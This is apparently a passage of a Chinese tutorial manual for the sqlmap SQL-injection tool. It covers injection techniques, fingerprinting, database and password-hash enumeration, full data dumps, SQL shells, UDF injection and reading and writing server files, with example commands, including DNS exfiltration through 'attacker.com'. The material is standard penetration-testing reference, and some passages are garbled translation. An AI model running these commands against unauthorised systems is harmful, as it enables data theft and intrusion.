4.7注入技法

这些参数用于对特定的SQL注入技术进行调整。


--technique 要测试的SQL注入技术

此选项可用于指定要测试的SQL注入类型。默认情况下，sqlmap测试用于它所支持全部的类型。在某些情况下，只想测试一种或几种特定类型的SQL注入思想，这就是这个选项发挥作用的地方。此选项需要一个参数。的任何组合组成的字符串。B, E, U, S, T和Q每个字母代表不同技术的字符：

B: Boolean-based blind SQL injection（布尔型注入）
E: Error-based SQL injection（报错型注入）
U: UNION query SQL injection（可联合查询注入）
S: Stacked queries SQL injection（可多语句查询注入）
T: Time-based blind SQL injection（基于时间延迟注入）

数不要超过10。此选项参数--predict-output兼容。

python sqlmap.py -u "目标链接"  --technique B

可以用“--technique ES”来指定使用两种检测技术。“--technique BEUSTQ”与默认情况等效。想要访问文件系统或是Windows的注册表就一定要添加“S”进行多语句查询注入测试。


--time-sec设定延迟注入的时间

用此参数设置基于时间延迟注入中延时时长，默认为5秒。

python sqlmap.py -u "目标链接"  --time-sec 10


--union-cols 联合查询注入中列数设置

默认情况下sqlmap测试UNION查询注入会测试1-10个字段数，当--level为5的时候他会增加测试到50个字段数。设定--union-cols的值是一段整数，如测试12-16个字段数，就会让Sqlmap的列数检测范围变成12到16。

python sqlmap.py -u "目标链接"  --union-cols 12-16


--union-char 联合查询注入中字符设置

默认情况下Sqlmap进行联合查询注入时使用空字符（NULL）。但当level值较高时Sqlmap会生成随机数用于联合查询注入。 因为有时使用空字符注入会失败而使用随机数会成功。使用此参数可以指定联合查询注入中使用的字符，如：“--union-char 123”“联合查询注入中使用的字符”就是“UNION ALL SELECT XXX, XXX”中的“XXX”。

python sqlmap.py -u "目标链接"  --union-char 123


--union-from 联合查询注入中表名设置

有些情况下在联合查询中必须指定一个有效和可访问的表名，否则联合查询会执行失败，如在微软的Access中。 也就是说，某些DBMS不支持“SELECT 1,2;”这样的语句，SELECT必须有FROM。 用此参数指定这个表名：

python sqlmap.py -u "目标链接"  --union-from=users


--dns-domain DNS溢出攻击

如果用户正在控制注册为DNS域服务器的计算机(例如域attacker.com)他可以使用这个选项来启动这个攻击。--dns-domain attacker.com)。运行sqlmap的先决条件是Administrator特权(特权端口53的使用)一种正常的盲注技术是可供开发的。这种攻击的唯一目的是加快数据检索的过程，以防至少识别了一种技术(最好是延时注入)。如果报错注入和联合查询注入可用，则将跳过这些技术，因为这些技术在默认情况下是首选的。

python sqlmap.py -u "目标链接"  --dns-domain attacker.com


--second-url --second-req --second-order二阶SQL注入

有时注入结果显示在别的页面，此时需要用此参数指明显示注入结果的页面，该参数后跟一个URL。

python sqlmap.py --second-url "目标链接"

有些时候注入点输入的数据看返回结果的时候并不是当前的页面，而是另外的一个页面，这时候就需要你指定到哪个页面获取响应判断真假。--second-order后面跟一个判断页面的URL地址。


4.8指纹


-f或--fingerprint 扩展数据库管理系统指纹

默认情况下，Web应用程序的后端数据库管理系统指纹由sqlmap自动处理。在检测阶段结束后，用户最终会被提示选择进一步使用哪个易受攻击的参数，sqlmap对后端数据库管理系统进行指纹识别，并通过知道在数据库体系结构的限制范围内使用哪种SQL语法、方言和查询来继续注入。

默认地Sqlmap会自动对注入目标进行数据库管理系统指纹识别。参数为-f或--fingerprint。

python sqlmap.py -u "目标链接" -f

若想执行更广泛的数据库管理系统指纹识别可以添加-b或--banner参数。

python sqlmap.py -u "目标链接" -b


4.9 枚举

这些选项可用于枚举表中包含的后端数据库管理系统信息、结构和数据。此外，您还可以运行自己的SQL语句。


--all 一键枚举全部数据

使用这一个参数就能列举所有可访问的数据。但不推荐使用，因为这会发送大量请求，把有用和无用的信息都列举出来。

python sqlmap.py -u "目标链接" --all


-b或--banner 枚举数据库管理系统信息

大多数的现代数据库管理系统都有一个函数或是环境变量能够返回数据库管理系统的版本号和最后的补丁级别以及底层的操作系统信息。 通常这个函数是version()、环境变量是@@version，当然要看目标数据库管理系统了。使用参数“-b”或“--banner”来列举数据库管理系统的这一信息。

python sqlmap.py -u "目标链接" --banner


--current-user 枚举当前用户

通过这种切换，可以从Web应用程序中检索数据库管理系统的用户，从而有效地执行对后端DBMS的查询。

python sqlmap.py -u "目标链接" --current-user


--current-db 枚举当前数据库

通过此开关，可以检索Web应用程序连接到的数据库管理系统的数据库名称。

python sqlmap.py -u "目标链接" --current-db


--hostname 枚举服务器主机名

使用此开关，可以检索数据库管理系统的主机名。

python sqlmap.py -u "目标链接" --hostname


--is-dba 检测当前用户是否是数据库管理员

判断当前的用户是否为管理，是的话会返回True。

python sqlmap.py -u "目标链接" --is-dba


--users 枚举数据库管理系统用户

当会话用户读取包含DBMS用户信息的系统表时，可以枚举用户列表。

python sqlmap.py -u "目标链接" --users


--passwords 枚举并破解数据库管理系统用户密码Hash值

当前用户有读取包含了数据库管理系统中用户密码Hash值的系统表的权限时使用这一参数可以列举数据库管理系统中用户密码Hash值。Sqlmap会先列举用户，再列举用户密码Hash值。

python sqlmap.py -u "目标链接" --passwords -v 1

Sqlmap不仅会列举出密码Hash，还会解析密码Hash格式，并询问用户是否要通过密码字典的方式破解Hash值寻找出明文密码。

若想只枚举特定用户的密码使用参数“-U”指定用户，可用“CU”来代表当前用户，如：

python sqlmap.py -u "目标链接" --passwords -U CU


--privileges 枚举数据库管理系统的用户权限

当前用户有读取包含了数据库管理系统中用户信息的系统表的权限时使用这一参数可以列举数据库管理系统中用户的权限。通过用户权限可以判断哪些用户是管理员。

若想只枚举特定用户的权限使用参数“-U”指定用户，可用“CU”来代表当前用户。

若目标是微软的SQL Server，这一参数会列出每个用户是否是管理员而不列出每个用户的具体权限。

python sqlmap.py -u "目标链接" --privileges


--roles 枚举数据库管理系统的用户角色

当会话用户读取包含DBMS用户信息的系统表时，可以枚举每个数据库管理系统用户的角色。可以提供以下选项-U若要指定要枚举特权的用户，请执行以下操作。若想只枚举特定用户的权限使用参数“-U”指定用户，可用“CU”来代表当前用户。只有当DBMS是Oracle时，此功能才可用。

python sqlmap.py -u "目标链接" --roles


--dbs 枚举数据库管理系统中的所有数据库

当前用户有读取包含了数据库管理系统中可用数据库信息的系统表的权限时使用这一参数可以列举数据库管理系统中所有数据库。

python sqlmap.py -u "目标链接" --dbs


--tables、--exclude-sysdbs和-D 枚举数据库的所有表

当前用户有读取包含了数据库管理系统中可用数据库中数据表信息的系统表的权限时使用参数“--tables”可以列举用参数“-D”指定的数据库中的所有数据表。若没有用参数“-D”指定数据库，只使用参数“--tables”会列举所有数据库中所有表。如：

python sqlmap.py -u  -u "目标链接" -D DBName --tables

使用参数“--exclude-sysdbs”可排除系统数据库。在Oracle中要指定TABLESPACE_NAME而不是数据库名。


--columns、-C、-T和-D枚举数据表的所有列

如权限允许，使用参数“--columns”可以列出用“-D”指定的数据库中用“-T”指定的表中的所有列的名字和数据类型。若没有指定数据库则会默认使用当前数据库。还可以用“-C”指定感兴趣的某几列这样就不用列出所有列来。如：

python sqlmap.py -u "目标链接" --columns -D testdb -T users


--schema和--exclude-sysdbs 枚举数据库管理系统的模式

用户可用此选项列举数据库管理系统的模式。模式列表包含所有数据库、表、列、触发器和他们各自的类型。同样地，可使用参数“--exclude-sysdbs”排除系统数据库。

python sqlmap.py -u  -u "目标链接" --schema


--count 枚举表中数据条数

有时我们只想知道有多少数据而不想知道具体的数据内容，此时就可以使用该参数。

python sqlmap.py -u "目标链接" --count -D testdb




--dump, -C, -T, -D, --start, --stop, --first, --last, --pivot-column和--where 导出表中数据

权限允许时可以导出表中数据。用参数“-D”指定数据库，用参数“-T”指定数据表，用参数“-C”指定目标列。 若只指定了数据表而没有指定数据库则默认使用当前数据库。若没有指定列则列举表中全部列。

下例是以Firebird为目标：

python sqlmap.py -u "目标链接" --dump -T users

 


只使用参数“--dump”和“-D”可以一次性导出整个数据库中所有数据。

Sqlmap会自动将参数“--dump”列举的数据保存到CSV格式文件中，文件具体路径会在Sqlmap的输出中给出，如：

python sqlmap.py -u "目标链接" -D testdb --dump

 


输出内容中最后一行便是CSV文件保存的路径。若只想列举部分数据可以使用参数“--start”和“--stop”。如只想列举第一条数据可以添加“--stop 1”，只想列举第二和第三条数据可以添加“--start 1 --stop 3”如：

python sqlmap.py -u "目标链接" -D testdb --start 1 --stop 3

还可以使用选项指定要导出的单个字段或字段范围。--first和--last。例如，如果要将列的数据从第三个字段枚举到第五个字段，参数为--first 3 --last 5。范围仅在盲注中有效，因为在报错注入和联合查询注入中区间范围会被忽略。

python sqlmap.py -u "目标链接" -D testdb --first 3 --last 5

除了用区间范围限制导出的数据外，还可以用“--where”参数来限制列举的数据。 “--where”参数会被Sqlmap转换成WHERE子句，如“--where id>3”会只列举列id的值大于3的数据。

python sqlmap.py -u "目标链接" -D testdb -T user --where id>3

如你所见，Sqlmap十分灵活。可以完整的导出整个数据库，也可以细致地在表中选择列，在列中又选择特定数据。


--dump-all和--exclude-sysdbs 枚举所有数据库所有表中所有数据

使用参数“--dump-all”可列举所有数据库所有表中所有数据。同样地，可使用参数“--exclude-sysdbs”排除系统数据库。注意SQL Server的master数据库不属于系统数据库，因为有些管理员会在这个数据库中存储用户数据。

python sqlmap.py -u "目标链接" -D testdb  --dump-all


--search, -C, -T, -D 搜索列、表或数据库

可以搜索数据库名，在所有数据库中搜索表名，在所有数据库的所有表中搜索列名。参数“--search”要和下列参数之一配合使用：

-C：后跟以逗号分隔的列名，在整个数据库管理系统中搜索

-T：后跟以逗号分隔的表名，在整个数据库管理系统中搜索

-D：后跟以逗号分隔的库名，在整个数据库管理系统中搜索

在搜索时，Sqlmap会询问用户进行精确搜索还是包含搜索。

默认为包含搜索，即搜索的字符串包含于结果中就认为命中。

精确搜索要求搜索的字符串与结果完全相等。

python sqlmap.py -u "目标链接" --search -D testdb 

 



--sql-query和--sql-shell 运行自定义SQL语句

这一功能允许执行任意的SQL语句，Sqlmap会自动解析给出的SQL语句，选择恰当的注入技术并将给出的SQL语句打包到payload中。

如果查询是个SELECT语句，Sqlmap会返回查询结果。如果Web应用使用的数据库管理系统支持多语句查询，Sqlmap会使用堆注入技术。

但要注意Web应用可能不支持堆查询，例如PHP使用Mysql时不支持堆查询，但使用PostgreSQL时支持堆查询。

python sqlmap.py -u "目标链接"  --sql-query "select 'tset'" -v 1



python sqlmap.py -u "目标链接"  --sql-query "select 'tset'" -v 2


如你所见，Sqlmap将提供的SQL语句分成了两个不同的SELECT语句，并分别返回结果。

参数“--sql-shell”提供一个交互式的SQL语句执行环境，支持Tab键补全和命令历史记录。如：

python sqlmap.py -u "目标链接" --sql-shell

 


4.10 暴力破解


--common-tables 暴力破解表名

有些情况下用“--tables”不能列出数据库中表名来，如：

Ø 版本小于5.0的MySQL没有information_schema表

Ø 微软Access的MSysObjects表默认不可读

Ø 数据库用户权限过低无法读取表名

当无法读出表名时可以使用参数“--common-tables”暴力破解表名，

该参数使用的字典是txt/common-tables.txt，其中存储了常见表名，可以手动编辑该文件。

python sqlmap.py -u "目标链接" --common-tables


--common-columns 暴力破解列名

参数：--common-columns

有些情况下用“--columns”不能列出数据表中列名来，如：

Ø 版本小于5.0的MySQL没有information_schema表

Ø 微软Access的MSysObjects表默认不可读

Ø 数据库用户权限过低无法读取列名

当无法读出列名时可以使用参数“--common-columns”暴力破解列名，

该参数使用的字典是txt/common-columns.txt，其中存储了常见列名，可以手动编辑该文件。

python sqlmap.py -u "目标链接" --common-columns


4.11 用户定义函数注入

这些选项可用于创建自定义用户定义的函数。


--udf-inject和--shared-lib 注入自定义用户定义函数(Udf)

UDF是“user-defined function”的缩写，UDF是一种针对MySQL和PostgreSQL的高级注入技术.可以编译MySQL或PostgreSQL的共享库、DLL（Windows）和共享对象（Linux/Unix）并将这些文件在本机上的路径提供给Sqlmap来进行UDF注入。

Sqlmap会先问一些问题然后上传UDF文件并创建UDF最后根据问题答案执行UDF。完成UDF注入后，Sqlmap会删除上传的UDF文件


--shared-lib 运行时询问共享库文件路径

此参数Sqlmap会在运行时询问共享库文件路径。在Sqlmap安装目录的udf目录中有许多UDF文件，按照DMBS、操作系统、位数和版本归类，可以直接使用。


4.12 文件系统的访问


--file-read 从数据库服务器的文件系统读取文件

当数据库管理系统是MySQL、PostgreSQL或微软的SQL Server且当前用户有读取文件相关权限时读取文件是可行的。读取的文件既可以是文件文件也可以是二进制文件。如：

python sqlmap.py -u "目标链接" --file-read "C:/example.exe" -v 1

 



--file-write和--file-dest 将文件上传到数据库服务器的文件系统

当数据库管理系统是MySQL、PostgreSQL或微软的SQL Server且当前用户有写文件相关权限时上传文件是可行的。上传的文件既可以是文件文件也可以是二进制文件，下例的目标数据库管理系统是MySQL，上传了一个txt文件： 

python sqlmap.py -u "目标链接" --file-write "写入文件路径" -v 1 --file-dest "服务器绝对路径"
